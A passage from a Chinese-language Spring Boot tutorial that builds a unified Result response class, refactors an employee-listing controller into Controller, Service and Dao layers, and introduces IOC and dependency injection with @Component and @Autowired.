<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Result</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer code;<span class="comment">//响应码，1 代表成功; 0 代表失败</span></span><br><span class="line">    <span class="keyword">private</span> String msg;  <span class="comment">//响应码 描述字符串</span></span><br><span class="line">    <span class="keyword">private</span> Object data; <span class="comment">//返回的数据</span></span><br><span class="line">	<span class="comment">// Result类构造方法</span></span><br><span class="line">    <span class="comment">// 一堆getter和setter方法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//增删改 成功响应(不需要给前端返回数据)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Result <span class="title function_">success</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Result</span>(<span class="number">1</span>,<span class="string">&quot;success&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//查询 成功响应(把查询结果做为返回数据响应给前端)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Result <span class="title function_">success</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Result</span>(<span class="number">1</span>,<span class="string">&quot;success&quot;</span>,data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//失败响应</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Result <span class="title function_">error</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Result</span>(<span class="number">0</span>,msg,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>改造Controller</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResponseController</span> &#123;</span><br><span class="line">    <span class="comment">// 响应统一格式的结果</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World ~&quot;</span>);</span><br><span class="line">        <span class="comment">//return new Result(1,&quot;success&quot;,&quot;Hello World ~&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> Result.success(<span class="string">&quot;Hello World ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 响应统一格式的结果</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/getAddr&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">getAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Address</span> <span class="variable">addr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>();</span><br><span class="line">        addr.setProvince(<span class="string">&quot;广东&quot;</span>);</span><br><span class="line">        addr.setCity(<span class="string">&quot;深圳&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Result.success(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//响应统一格式的结果</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/listAddr&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">listAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;Address&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">Address</span> <span class="variable">addr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>();</span><br><span class="line">        addr.setProvince(<span class="string">&quot;广东&quot;</span>);</span><br><span class="line">        addr.setCity(<span class="string">&quot;深圳&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Address</span> <span class="variable">addr2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>();</span><br><span class="line">        addr2.setProvince(<span class="string">&quot;陕西&quot;</span>);</span><br><span class="line">        addr2.setCity(<span class="string">&quot;西安&quot;</span>);</span><br><span class="line"></span><br><span class="line">        list.add(addr);</span><br><span class="line">        list.add(addr2);</span><br><span class="line">        <span class="keyword">return</span> Result.success(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="案例"><a class="header-anchor" href="#案例">¶</a>案例</h4>
<h5 id="需求"><a class="header-anchor" href="#需求">¶</a>需求</h5>
<ul>
<li>加载并解析<code>xml文件</code>中的数据，完成数据处理，并在页面展示</li>
<li>获取员工数据，返回统一响应结果，在页面渲染展示</li>
</ul>
<h5 id="准备工作"><a class="header-anchor" href="#准备工作">¶</a>准备工作</h5>
<ul>
<li>
<p><code>XML文件</code>，放在<code>src/main/resources</code>目录下</p>
</li>
<li>
<p>XML文件的工具类</p>
</li>
<li>
<p>前端页面资源，放在<code>src/main/resources</code>下的<code>static</code>目录下</p>
<blockquote>
<p>在SpringBoot项目中，静态资源默认可以存放的目录：</p>
<ul>
<li>classpath:/static/</li>
<li>classpath:/public/</li>
<li>classpath:/resources/</li>
<li>classpath:/META-INF/resources/</li>
</ul>
<p>classpath：</p>
<ul>
<li>代表的是类路径，在maven的项目中，其实指的就是 src/main/resources 或者 src/main/java，但是java目录是存放java代码的，所以相关的配置文件及静态资源文档，就放在 src/main/resources下。</li>
</ul>
</blockquote>
</li>
</ul>
<h5 id="实现步骤"><a class="header-anchor" href="#实现步骤">¶</a>实现步骤</h5>
<ol>
<li>在pom.xml文件中引入dom4j的依赖，用于解析XML文件</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.dom4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dom4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>
<p>引入：解析XML的工具类<code>XMLParserUtils</code>、实体类<code>Emp</code>、XML文件<code>emp.xml</code></p>
</li>
<li>
<p>引入：静态页面文件，放在<code>resources</code>下的<code>static</code>目录下</p>
</li>
<li>
<p>创建<code>EmpController</code>类，编写<code>Controller</code>程序，处理请求，响应数据</p>
</li>
</ol>
<h5 id="代码实现"><a class="header-anchor" href="#代码实现">¶</a>代码实现</h5>
<ul>
<li><code>Controller</code>代码</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/listEmp&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">list</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//1. 加载并解析emp.xml</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getClassLoader().getResource(<span class="string">&quot;emp.xml&quot;</span>).getFile();</span><br><span class="line">        <span class="comment">//System.out.println(file);</span></span><br><span class="line">        List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 对数据进行转换处理 - gender, job</span></span><br><span class="line">        empList.stream().forEach(emp -&gt; &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//处理 gender 1: 男, 2: 女</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> emp.getGender();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;女&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//处理job - 1: 讲师, 2: 班主任 , 3: 就业指导</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">job</span> <span class="operator">=</span> emp.getJob();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;讲师&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;班主任&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;3&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;就业指导&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//3. 响应数据</span></span><br><span class="line">        <span class="keyword">return</span> Result.success(empList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>统一返回结果实体类<code>Result</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Result</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer code ;<span class="comment">//1 成功 , 0 失败</span></span><br><span class="line">    <span class="keyword">private</span> String msg; <span class="comment">//提示信息</span></span><br><span class="line">    <span class="keyword">private</span> Object data; <span class="comment">//数据 date</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造方法Result()</span></span><br><span class="line">    <span class="comment">// getter和setter方法</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//查询 成功响应(把查询结果做为返回数据响应给前端)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Result <span class="title function_">success</span><span class="params">(Object data)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Result</span>(<span class="number">1</span>, <span class="string">&quot;success&quot;</span>, data);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增删改 成功响应(不需要给前端返回数据)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Result <span class="title function_">success</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Result</span>(<span class="number">1</span>, <span class="string">&quot;success&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//失败响应</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Result <span class="title function_">error</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Result</span>(<span class="number">0</span>, msg, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="测试"><a class="header-anchor" href="#测试">¶</a>测试</h5>
<ul>
<li>运行启动类，启动服务进行测试</li>
<li>用Postman测试</li>
<li>浏览器输入：<code>http://localhost:8080/emp.html</code></li>
</ul>
<h5 id="问题分析"><a class="header-anchor" href="#问题分析">¶</a>问题分析</h5>
<ul>
<li><strong>解析XML数据</strong>，<strong>获取数据</strong>，<strong>处理数据的逻辑</strong>，<strong>给页面响应</strong>的代码全部堆积一起，写在<code>controller</code>方法内</li>
<li>造成的问题：当业务逻辑变复杂，无论是：<strong>修改操作数据部分的代码</strong>、<strong>完善逻辑处理部分的代码</strong>、<strong>修改数据响应的代码</strong>，都需要改动Controller</li>
<li>导致结果：工程代码复用性较差+代码难以维护</li>
<li>解决方案：分层开发</li>
</ul>
<h3 id="分层解耦"><a class="header-anchor" href="#分层解耦">¶</a>分层解耦</h3>
<h4 id="三层架构"><a class="header-anchor" href="#三层架构">¶</a>三层架构</h4>
<ul>
<li>
<p>尽可能让每一个接口、类、方法的职责更单一些（<strong>单一职责原则</strong>）</p>
<blockquote>
<p>单一职责原则：</p>
<p>一个类或一个方法，就只做一件事情，只管一块功能</p>
<p>这样就可以让类、接口、方法的复杂度更低，可读性更强，扩展性更好，也更利用后期的维护</p>
</blockquote>
</li>
<li>
<p>上述代码的处理逻辑组成：</p>
<ul>
<li><strong><u>数据访问</u></strong>：负责业务数据的维护操作，包括增、删、改、查等操作</li>
<li><strong><u>逻辑处理</u></strong>：负责业务逻辑处理的代码</li>
<li><strong><u>请求处理、响应数据</u></strong>：负责，接收页面的请求，给页面响应数据</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>Controller</th>
<th>→</th>
<th>Service</th>
<th>→</th>
<th>Dao</th>
</tr>
</thead>
<tbody>
<tr>
<td>接收请求、响应数据</td>
<td></td>
<td>逻辑处理</td>
<td></td>
<td>数据访问层(Data Access Object)</td>
</tr>
<tr>
<td>控制层。接收前端发送的请求，对请求进行处理，并响应数据</td>
<td>←</td>
<td>业务逻辑层。处理具体的业务逻辑。</td>
<td>←</td>
<td>也称为持久层。负责数据访问操作，包括数据的增、删、改、查</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>基于**<u>三层架构</u>**的程序执行流程</p>
<ul>
<li>前端发起的<strong>请求</strong>，由<strong>Controller层接收</strong>（Controller<strong>响应</strong>数据给前端）</li>
<li>Controller层<strong>调用Service层</strong>来进行<strong>逻辑处理</strong>（Service层处理完后，把处理结果返回给Controller层）</li>
<li>Serivce层<strong>调用Dao层</strong>（逻辑处理过程中需要用到的一些数据要从Dao层获取）</li>
<li>Dao层<strong>操作文件中的数据</strong>（Dao拿到的数据会返回给Service层）</li>
</ul>
<blockquote>
<p>按照三层架构的思想，对业务逻辑(Service层)进行变更，不会影响到Controller层和Dao层</p>
<p>程序的扩展性、维护性↑↑↑</p>
</blockquote>
</li>
</ul>
<h5 id="代码拆分"><a class="header-anchor" href="#代码拆分">¶</a>代码拆分</h5>
<ul>
<li>用三层架构思想改造程序
<ul>
<li>控制层包名：xxxx.controller</li>
<li>业务逻辑层包名：xxxx.service</li>
<li>数据访问层包名：xxxx.dao</li>
</ul>
</li>
</ul>
<h6 id="控制层"><a class="header-anchor" href="#控制层">¶</a>控制层</h6>
<ul>
<li><strong>接收</strong>前端发送的<strong>请求</strong>，对请求进行处理，并<strong>响应</strong>数据</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpController</span> &#123;</span><br><span class="line">    <span class="comment">//业务层对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">EmpService</span> <span class="variable">empService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EmpServiceA</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/listEmp&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">list</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//1. 调用service层, 获取数据</span></span><br><span class="line">        List&lt;Emp&gt; empList = empService.listEmp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. 响应数据</span></span><br><span class="line">        <span class="keyword">return</span> Result.success(empList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="业务逻辑层"><a class="header-anchor" href="#业务逻辑层">¶</a>业务逻辑层</h6>
<ul>
<li>处理具体的业务逻辑</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 业务逻辑接口（制定业务标准）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">EmpService</span> &#123;</span><br><span class="line">    <span class="comment">//获取员工列表</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 业务逻辑实现类（按照业务标准实现）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpServiceA</span> <span class="keyword">implements</span> <span class="title class_">EmpService</span> &#123;</span><br><span class="line">    <span class="comment">//dao层对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">EmpDao</span> <span class="variable">empDao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EmpDaoA</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1. 调用dao, 获取数据</span></span><br><span class="line">        List&lt;Emp&gt; empList = empDao.listEmp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 对数据进行转换处理 - gender, job</span></span><br><span class="line">        empList.stream().forEach(emp -&gt; &#123;</span><br><span class="line">            <span class="comment">//处理 gender 1: 男, 2: 女</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> emp.getGender();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;女&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//处理job - 1: 讲师, 2: 班主任 , 3: 就业指导</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">job</span> <span class="operator">=</span> emp.getJob();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;讲师&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;班主任&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;3&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;就业指导&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> empList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="数据访问层"><a class="header-anchor" href="#数据访问层">¶</a>数据访问层</h6>
<ul>
<li>负责数据的访问操作，包含数据的增、删、改、查</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">///数据访问层接口（制定标准）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">EmpDao</span> &#123;</span><br><span class="line">    <span class="comment">//获取员工列表数据</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//数据访问实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpDaoA</span> <span class="keyword">implements</span> <span class="title class_">EmpDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1. 加载并解析emp.xml</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getClassLoader().getResource(<span class="string">&quot;emp.xml&quot;</span>).getFile();</span><br><span class="line">        System.out.println(file);</span><br><span class="line">        List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);</span><br><span class="line">        <span class="keyword">return</span> empList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>三层架构的好处
<ul>
<li>复用性强</li>
<li>便于维护</li>
<li>利用扩展</li>
</ul>
</li>
</ul>
<h4 id="分层解耦-v2"><a class="header-anchor" href="#分层解耦-v2">¶</a>分层解耦</h4>
<h5 id="耦合问题"><a class="header-anchor" href="#耦合问题">¶</a>耦合问题</h5>
<ul>
<li>
<p><strong>内聚</strong></p>
<blockquote>
<p>软件中各个功能模块内部的功能联系</p>
</blockquote>
</li>
<li>
<p><strong>耦合</strong></p>
<blockquote>
<p>衡量软件中各个层/模块之间的依赖、关联的程度</p>
</blockquote>
</li>
<li>
<p>软件设计原则：高内聚低耦合</p>
<blockquote>
<p>高内聚：一个模块中各个元素之间的联系的紧密程度，如果各个元素(语句、程序段)之间的联系程度越高，则内聚性越高，即 “高内聚”</p>
<p>低耦合：软件中各个层、模块之间的依赖关联程序越低越好</p>
</blockquote>
</li>
<li>
<p>高内聚的体现：</p>
<ul>
<li>在当前的Service类中，只编写了和员工相关的逻辑处理，和员工无关的逻辑处理在当前类中没有体现</li>
</ul>
</li>
<li>
<p>程序中耦合代码的体现：</p>
<ul>
<li>变更业务类，需要修改controller层中的代码</li>
</ul>
</li>
<li>
<p>高内聚、低耦合的目的：</p>
<ul>
<li>使程序模块的可重用性、移植性大大增强</li>
</ul>
</li>
</ul>
<h5 id="解耦思路"><a class="header-anchor" href="#解耦思路">¶</a>解耦思路</h5>
<ul>
<li>
<p>之前的做法：创建对象，new一个→层与层之间的代码耦合→当service层的实现变化，还需要修改controller层的代码</p>
</li>
<li>
<p>解耦：</p>
<ul>
<li>首先不能在EmpController中使用new对象→没有业务层对象（程序运行就报错）</li>
<li>解决思路：
<ul>
<li>提供一个容器，容器中存储一些对象(例：EmpService对象)</li>
<li>controller程序从容器中获取EmpService类型的对象</li>
</ul>
</li>
</ul>
</li>
</ul>
<h6 id="Spring中的两个核心概念"><a class="header-anchor" href="#Spring中的两个核心概念">¶</a>Spring中的两个核心概念</h6>
<ul>
<li>
<p><strong>控制反转：</strong> Inversion Of Control，简称IOC。对象的创建控制权由程序自身转移到外部（容器），这种思想称为控制反转</p>
<blockquote>
<p>对象的创建权由程序员主动创建转移到容器(由容器创建、管理对象)。这个容器称为：IOC容器或Spring容器</p>
</blockquote>
</li>
<li>
<p><strong>依赖注入：</strong> Dependency Injection，简称DI。容器为应用程序提供运行时，所依赖的资源，称之为依赖注入</p>
<blockquote>
<p>程序运行时需要某个资源，此时容器就为其提供这个资源</p>
<p>例：EmpController程序运行时需要EmpService对象，Spring容器就为其提供并注入EmpService对象</p>
</blockquote>
</li>
</ul>
<h4 id="IOC-DI"><a class="header-anchor" href="#IOC-DI">¶</a>IOC&amp;DI</h4>
<h5 id="IOC-DI入门"><a class="header-anchor" href="#IOC-DI入门">¶</a>IOC&amp;DI入门</h5>
<ul>
<li>任务：完成Controller层、Service层、Dao层的<strong>代码解耦</strong></li>
<li>思路：
<ul>
<li>删除Controller层、Service层中new对象的代码</li>
<li>Service层及Dao层的实现类，交给IOC容器管理</li>
<li>为Controller及Service注入运行时依赖的对象
<ol>
<li>Controller程序中注入依赖的Service层对象</li>
<li>Service程序中注入依赖的Dao层对象</li>
</ol>
</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第1步：删除Controller层、Service层中new对象的代码</span><br><span class="line"></span><br><span class="line">第2步：Service层及Dao层的实现类，交给IOC容器管理</span><br><span class="line">- 使用Spring提供的注解：@Component ，就可以实现类交给IOC容器管理</span><br><span class="line"></span><br><span class="line">第3步：为Controller及Service注入运行时依赖的对象</span><br><span class="line">- 使用Spring提供的注解：@Autowired ，就可以实现程序运行时IOC容器自动注入需要的依赖对象</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 完整的三层代码</span></span><br><span class="line"><span class="comment">// Controller层</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span> <span class="comment">//运行时,从IOC容器中获取该类型对象,赋值给该变量</span></span><br><span class="line">    <span class="keyword">private</span> EmpService empService ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/listEmp&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">list</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//1. 调用service, 获取数据</span></span><br><span class="line">        List&lt;Emp&gt; empList = empService.listEmp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. 响应数据</span></span><br><span class="line">        <span class="keyword">return</span> Result.success(empList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Service层</span></span><br><span class="line"><span class="meta">@Component</span> <span class="comment">//将当前对象交给IOC容器管理,成为IOC容器的bean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpServiceA</span> <span class="keyword">implements</span> <span class="title class_">EmpService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span> <span class="comment">//运行时,从IOC容器中获取该类型对象,赋值给该变量</span></span><br><span class="line">    <span class="keyword">private</span> EmpDao empDao ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1. 调用dao, 获取数据</span></span><br><span class="line">        List&lt;Emp&gt; empList = empDao.listEmp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 对数据进行转换处理 - gender, job</span></span><br><span class="line">        empList.stream().forEach(emp -&gt; &#123;</span><br><span class="line">            <span class="comment">//处理 gender 1: 男, 2: 女</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> emp.getGender();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;女&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//处理job - 1: 讲师, 2: 班主任 , 3: 就业指导</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">job</span> <span class="operator">=</span> emp.getJob();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;讲师&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;班主任&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;3&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;就业指导&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> empList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dao层</span></span><br><span class="line"><span class="meta">@Component</span> <span class="comment">//将当前对象交给IOC容器管理,成为IOC容器的bean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpDaoA</span> <span class="keyword">implements</span> <span class="title class_">EmpDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1. 加载并解析emp.xml</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getClassLoader().getResource(<span class="string">&quot;emp.xml&quot;</span>).getFile();</span><br><span class="line">        System.out.println(file);</span><br><span class="line">        List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);</span><br><span class="line">        <span class="keyword">return</span> empList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="IOC详解"><a class="header-anchor" href="#IOC详解">¶</a>IOC详解</h5>
<ul>
<li>IOC控制反转和DI依赖注入</li>
</ul>
<h6 id="bean的声明"><a class="header-anchor" href="#bean的声明">¶</a>bean的声明</h6>
<ul>
<li><strong><u>IOC控制反转</u></strong>：将对象的控制权交给Spring的IOC容器，由IOC容器创建及管理对象</li>
<li>IOC容器创建的对象称为<strong>bean对象</strong></li>
<li>将某个对象交给IOC容器管理，需要在类上添加注释：<code>@Component</code></li>
<li><code>@Component</code>的衍生注释
